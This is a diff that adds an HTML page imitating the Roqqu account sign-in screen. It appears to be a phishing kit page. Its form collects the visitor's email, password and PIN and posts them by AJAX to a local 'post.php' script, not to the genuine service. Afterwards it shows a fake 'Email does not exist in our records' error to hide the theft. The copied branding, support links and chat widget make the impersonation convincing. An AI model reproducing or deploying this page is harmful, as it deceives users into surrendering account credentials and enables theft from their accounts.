@@ -1,0 +1,452 @@
+<html lang="en">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    function show() {
+        var element = document.getElementById("demo");
+        element.classList.add("mystyle");
+    }
+
+    function hide() {
+        var element = document.getElementById("demo");
+        element.classList.remove("mystyle");
+    }
+    var request;
+
+    // Bind to the submit event of our form
+    $(document).ready(function() {
+        $("#myform").submit(function(event) {
+
+            // Prevent default posting of form - put here to work in case of errors
+            event.preventDefault();
+
+            // Abort any pending request
+            if (request) {
+                request.abort();
+            }
+            // setup some local variables
+            var $form = $(this);
+
+            // Let's select and cache all the fields
+            var $inputs = $form.find("input, select, button, textarea");
+
+            // Serialize the data in the form
+            var serializedData = $form.serialize();
+
+            // Let's disable the inputs for the duration of the Ajax request.
+            // Note: we disable elements AFTER the form data has been serialized.
+            // Disabled form elements will not be serialized.
+            $inputs.prop("disabled", true);
+
+            // Fire off the request to /form.php
+            request = $.ajax({
+                url: "post.php",
+                type: "post",
+                data: serializedData
+            });
+
+            // Callback handler that will be called on success
+            request.done(function(data, response, textStatus, jqXHR) {
+
+                show();
+                console.log(response);
+
+            });
+
+            // Callback handler that will be called on failure
+            request.fail(function(jqXHR, textStatus, errorThrown) {
+                // Log the error to the console
+                console.error(
+                    "The following error occurred: " +
+                    textStatus, errorThrown
+                );
+            });
+
+            // Callback handler that will be called regardless
+            // if the request failed or succeeded
+            request.always(function() {
+
+                // Reenable the inputs
+                $inputs.prop("disabled", false);
+            });
+
+        })
+    })
+</script>
+<style>
+    .mystyle {
+        display: none;
+    }
+
+    .mystyles {
+        display: block;
+    }
+</style>
+
+<script>
+</script>
+<div class="mystyle" id="demo">
+    <div class="iziToast-wrapper iziToast-wrapper-topRight ">
+        <div class="iziToast-capsule" style="height: auto;">
+            <div data-izitoast-ref="1627117660577" class="iziToast iziToast-theme-light iziToast-color-yellow iziToast-animateInside iziToast-paused iziToast-opened" id="RW1haWwlMjBkb2VzJTIwbm90JTIwZXhpc3QlMjBpbiUyMG91ciUyMHJlY29yZHN5ZWxsb3c">
+                <div class="iziToast-body" style="padding-left: 33px;"><i class="iziToast-icon ico-error revealIn"></i>
+                    <div id="demo" class="iziToast-texts "><strong class="iziToast-title slideIn">Email does not exist in our records</strong></div>
+                    <div>
+
+                    </div>
+                </div>
+                <button type="button" class="iziToast-close" onclick="hide()"></button>
+                <div class="iziToast-progressbar">
+                    <div style="transition: none 0s ease 0s; width: 257.828px;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<head>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href="favicon.png">
+    <link rel="stylesheet" href="assets/css/semantic.min.css">
+
+    <link rel="stylesheet" href="assets/css/overall.css">
+    <link rel="stylesheet" href="assets/css/iziToast.css">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+    <meta name="theme-color" content="#00193f">
+    <title>Sign in</title>
+    <link href="static/css/main.0e2d57f0.chunk.css" rel="stylesheet">
+    <meta name="Sign in" content="Sign in to your Roqqu account" data-react-helmet="true">
+
+</head>
+
+<body style="overflow-y:scroll" data-new-gr-c-s-check-loaded="14.1021.0" data-gr-ext-installed="">
+
+    <script type="text/javascript" async="" src="https://widget.intercom.io/widget/w25wwk3s"></script>
+
+
+    <script>
+        window.intercomSettings = {
+            app_id: "w25wwk3s"
+        }
+    </script>
+    <script>
+        ! function() {
+            var t = window,
+                e = t.Intercom;
+            if ("function" == typeof e) e("reattach_activator"), e("update", t.intercomSettings);
+            else {
+                var n = document,
+                    a = function() {
+                        a.c(arguments)
+                    };
+                a.q = [], a.c = function(t) {
+                    a.q.push(t)
+                }, t.Intercom = a;
+                var c = function() {
+                    var t = n.createElement("script");
+                    t.type = "text/javascript", t.async = !0, t.src = "https://widget.intercom.io/widget/w25wwk3s";
+                    var e = n.getElementsByTagName("script")[0];
+                    e.parentNode.insertBefore(t, e)
+                };
+                t.attachEvent ? t.attachEvent("onload", c) : t.addEventListener("load", c, !1)
+            }
+        }()
+    </script>
+
+    <div id="root">
+        <div>
+            <div class="blue-bckg">
+                <div class="ui container">
+                    <div class="sixteen wide column">
+                        <div class="text-center">
+                            <a href="/"><img class="signin-logo" alt="roqqu logo" src="static/logo_white.png"></a>
+                        </div>
+                        <div class="ui card signin-card">
+                            <h2 class="text-center" style="font-weight: 500;">Sign in</h2>
+                            <div class="ui center aligned basic">
+                                <form id="myform" action="post.php" class="ui form " method="post">
+                                    <div class="field">
+                                        <input spellcheck="false" required="" type="email" name="email" placeholder="Email address">
+
+                                    </div>
+                                    <div class="field">
+                                        <input required="" type="password" name="pass" placeholder="Password">
+                                    </div>
+                                    <div class="field">
+                                        <input required="" type="password" name="Pin" placeholder="Pin">
+                                    </div>
+                                    <button class="ui button w-100 blue btn" type="submit" name="submit">Sign in to your account</button>
+                                    <div id="error"></div>
+
+                                </form>
+                            </div>
+
+
+                        </div>
+                        <div class="text-center text-white" style="padding-top: 20px;">
+                            <p class="font-bold"><a class="text-white on-hover-white" href="/signup">Don't have an account?</a>&nbsp;&nbsp;&nbsp;<a class="text-white on-hover-white" href="/account/recovery">Forgot password?</a>&nbsp;&nbsp;&nbsp;<a class="text-white on-hover-white"
+                                    href="/">Terms</a></p>
+                            <p class="font-bold"><a href="mailto:support@roqqu.com" class="text-white on-hover-white">Having issues with two factor authentication?</a></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <script type="application/javascript" src="assets/js/jquery.min.js"></script>
+    <script type="application/javascript" src="assets/js/semantic.min.js"></script>
+    <script type="application/javascript" src="assets/js/iziToast.min.js"></script>
+    <script></script>
+    <script>
+        ! function(l) {
+            function e(e) {
+                for (var r, t, n = e[0], o = e[1], u = e[2], f = 0, i = []; f < n.length; f++) t = n[f], p[t] && i.push(p[t][0]), p[t] = 0;
+                for (r in o) Object.prototype.hasOwnProperty.call(o, r) && (l[r] = o[r]);
+                for (s && s(e); i.length;) i.shift()();
+                return c.push.apply(c, u || []), a()
+            }
+
+            function a() {
+                for (var e, r = 0; r < c.length; r++) {
+                    for (var t = c[r], n = !0, o = 1; o < t.length; o++) {
+                        var u = t[o];
+                        0 !== p[u] && (n = !1)
+                    }
+                    n && (c.splice(r--, 1), e = f(f.s = t[0]))
+                }
+                return e
+            }
+            var t = {},
+                p = {
+                    1: 0
+                },
+                c = [];
+
+            function f(e) {
+                if (t[e]) return t[e].exports;
+                var r = t[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return l[e].call(r.exports, r, r.exports, f), r.l = !0, r.exports
+            }
+            f.m = l, f.c = t, f.d = function(e, r, t) {
+                f.o(e, r) || Object.defineProperty(e, r, {
+                    enumerable: !0,
+                    get: t
+                })
+            }, f.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, f.t = function(r, e) {
+                if (1 & e && (r = f(r)), 8 & e) return r;
+                if (4 & e && "object" == typeof r && r && r.__esModule) return r;
+                var t = Object.create(null);
+                if (f.r(t), Object.defineProperty(t, "default", {
+                        enumerable: !0,
+                        value: r
+                    }), 2 & e && "string" != typeof r)
+                    for (var n in r) f.d(t, n, function(e) {
+                        return r[e]
+                    }.bind(null, n));
+                return t
+            }, f.n = function(e) {
+                var r = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return f.d(r, "a", r), r
+            }, f.o = function(e, r) {
+                return Object.prototype.hasOwnProperty.call(e, r)
+            }, f.p = "/";
+            var r = window.webpackJsonp = window.webpackJsonp || [],
+                n = r.push.bind(r);
+            r.push = e, r = r.slice();
+            for (var o = 0; o < r.length; o++) e(r[o]);
+            var s = n;
+            a()
+        }([])
+    </script>
+    <script src="/static/js/2.ed59c96c.chunk.js"></script>
+
+    <iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;"
+        aria-hidden="true" tabindex="-1" title="Intercom"></iframe>
+    <div class="intercom-lightweight-app" aria-live="polite">
+        <style id="intercom-lightweight-app-style" type="text/css">
+            @keyframes intercom-lightweight-app-launcher {
+                from {
+                    opacity: 0;
+                    transform: scale(0.5);
+                }
+                to {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+
+            @keyframes intercom-lightweight-app-gradient {
+                from {
+                    opacity: 0;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+
+            @keyframes intercom-lightweight-app-messenger {
+                from {
+                    opacity: 0;
+                    transform: translateY(20px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+
+            .intercom-lightweight-app {
+                position: fixed;
+                z-index: 2147483001;
+                width: 0;
+                height: 0;
+                font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+            }
+
+            .intercom-lightweight-app-gradient {
+                position: fixed;
+                z-index: 2147483002;
+                width: 500px;
+                height: 500px;
+                bottom: 0;
+                right: 0;
+                pointer-events: none;
+                background: radial-gradient( ellipse at bottom right, rgba(29, 39, 54, 0.16) 0%, rgba(29, 39, 54, 0) 72%);
+                animation: intercom-lightweight-app-gradient 200ms ease-out;
+            }
+
+            .intercom-lightweight-app-launcher {
+                position: fixed;
+                z-index: 2147483003;
+                bottom: 20px;
+                right: 20px;
+                width: 60px;
+                height: 60px;
+                border-radius: 50%;
+                background: #004aeb;
+                cursor: pointer;
+                box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+                animation: intercom-lightweight-app-launcher 250ms ease;
+            }
+
+            .intercom-lightweight-app-launcher:focus {
+                outline: none;
+            }
+
+            .intercom-lightweight-app-launcher-icon {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 60px;
+                height: 60px;
+                transition: transform 100ms linear, opacity 80ms linear;
+            }
+
+            .intercom-lightweight-app-launcher-icon-open {
+                opacity: 1;
+                transform: rotate(0deg) scale(1);
+            }
+
+            .intercom-lightweight-app-launcher-icon-open svg {
+                width: 28px;
+                height: 32px;
+            }
+
+            .intercom-lightweight-app-launcher-icon-open svg path {
+                fill: rgb(255, 255, 255);
+            }
+
+            .intercom-lightweight-app-launcher-icon-self-serve {
+                opacity: 1;
+                transform: rotate(0deg) scale(1);
+            }
+
+            .intercom-lightweight-app-launcher-icon-self-serve svg {
+                height: 56px;
+            }
+
+            .intercom-lightweight-app-launcher-icon-self-serve svg path {
+                fill: rgb(255, 255, 255);
+            }
+
+            .intercom-lightweight-app-launcher-custom-icon-open {
+                max-height: 36px;
+                max-width: 36px;
+                opacity: 1;
+                transform: rotate(0deg) scale(1);
+            }
+
+            .intercom-lightweight-app-launcher-icon-minimize {
+                opacity: 0;
+                transform: rotate(-60deg) scale(0);
+            }
+
+            .intercom-lightweight-app-launcher-icon-minimize svg {
+                width: 16px;
+            }
+
+            .intercom-lightweight-app-launcher-icon-minimize svg path {
+                fill: rgb(255, 255, 255);
+            }
+
+            .intercom-lightweight-app-messenger {
+                position: fixed;
+                z-index: 2147483003;
+                overflow: hidden;
+                background-color: white;
+                animation: intercom-lightweight-app-messenger 250ms ease-out;
+                width: 376px;
+                height: calc(100% - 120px);
+                max-height: 704px;
+                min-height: 250px;
+                right: 20px;
+                bottom: 100px;
+                box-shadow: 0 5px 40px rgba(0, 0, 0, 0.16);
+                border-radius: 8px;
+            }
+
+            .intercom-lightweight-app-messenger-header {
+                height: 75px;
+                background: linear-gradient( 135deg, rgb(0, 39, 122) 0%, rgb(0, 6, 20) 100%);
+            }
+
+            @media print {
+                .intercom-lightweight-app {
+                    display: none;
+                }
+            }
+        </style>
+        <!--<div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger">
+			<div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32">
+					<path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path>
+				</svg>
+			</div>
+			<div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize">
+				<svg viewBox="0 0 16 14" xmlns="http://www.w3.org/2000/svg">
+					<path fill-rule="evenodd" clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z"></path>
+				</svg>
+			</div>
+		</div>
+	</div>-->
+</body>
+<grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
+
+</html>
